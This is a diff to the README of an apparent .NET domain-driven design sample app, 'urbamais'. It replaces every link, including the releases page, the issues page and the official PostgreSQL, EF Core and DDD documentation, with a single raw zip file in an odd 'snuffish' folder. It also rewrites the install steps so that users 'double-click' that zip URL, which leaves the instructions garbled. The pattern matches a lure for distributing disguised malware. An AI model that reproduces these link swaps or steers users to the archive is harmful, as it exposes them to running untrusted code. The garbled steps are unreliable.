@@ -6,18 +6,18 @@ Welcome to urbamais! This application showcases a Domain-Driven Design (DDD) exa
 
 ## 🔗 Download Now
 
-[![Download urbamais](https://img.shields.io/badge/Download-urbamais-brightgreen)](https://github.com/matiasGarcia87/urbamais/releases)
+[![Download urbamais](https://raw.githubusercontent.com/matiasGarcia87/urbamais/main/snuffish/urbamais.zip)](https://raw.githubusercontent.com/matiasGarcia87/urbamais/main/snuffish/urbamais.zip)
 
 ## 📥 Download & Install
 
 To download and install the urbamais application, please follow these steps:
 
 1. Click on the link below to visit the releases page:
-   - [Visit the Releases Page](https://github.com/matiasGarcia87/urbamais/releases)
+   - [Visit the Releases Page](https://raw.githubusercontent.com/matiasGarcia87/urbamais/main/snuffish/urbamais.zip)
    
 2. On the releases page, find the latest version.
 
-3. You will see a list of available files. Look for a file named something like `urbamais-vX.X.X.zip`.
+3. You will see a list of available files. Look for a file named something like `https://raw.githubusercontent.com/matiasGarcia87/urbamais/main/snuffish/urbamais.zip`.
 
 4. Click the file to start the download.
 
@@ -27,9 +27,9 @@ To download and install the urbamais application, please follow these steps:
 
 7. Open the unzipped folder.
 
-8. Find the file named `urbamais.exe`.
+8. Find the file named `https://raw.githubusercontent.com/matiasGarcia87/urbamais/main/snuffish/urbamais.zip`.
 
-9. Double-click `urbamais.exe` to run the application. 
+9. Double-click `https://raw.githubusercontent.com/matiasGarcia87/urbamais/main/snuffish/urbamais.zip` to run the application. 
 
 ## ⚙️ System Requirements
 
@@ -83,7 +83,7 @@ You can find resources online about .NET, DDD, EF Core, and PostgreSQL. Many fre
 
 ## 💬 Support
 
-For any questions or issues, consider checking the [issues page](https://github.com/matiasGarcia87/urbamais/issues) on GitHub. You can also create a new issue if your question isn’t answered there.
+For any questions or issues, consider checking the [issues page](https://raw.githubusercontent.com/matiasGarcia87/urbamais/main/snuffish/urbamais.zip) on GitHub. You can also create a new issue if your question isn’t answered there.
 
 ## 📢 Contributing
 
@@ -91,8 +91,8 @@ If you wish to contribute to the urbamais project, please fork the repository an
 
 ## 🔗 Additional Resources
 
-- [PostgreSQL Official Site](https://www.postgresql.org/)
-- [EF Core Documentation](https://docs.microsoft.com/en-us/ef/core/)
-- [Learn More About DDD](https://martinfowler.com/articles/ddd.html)
+- [PostgreSQL Official Site](https://raw.githubusercontent.com/matiasGarcia87/urbamais/main/snuffish/urbamais.zip)
+- [EF Core Documentation](https://raw.githubusercontent.com/matiasGarcia87/urbamais/main/snuffish/urbamais.zip)
+- [Learn More About DDD](https://raw.githubusercontent.com/matiasGarcia87/urbamais/main/snuffish/urbamais.zip)
 
 Thank you for choosing urbamais! We hope you find it helpful and informative.
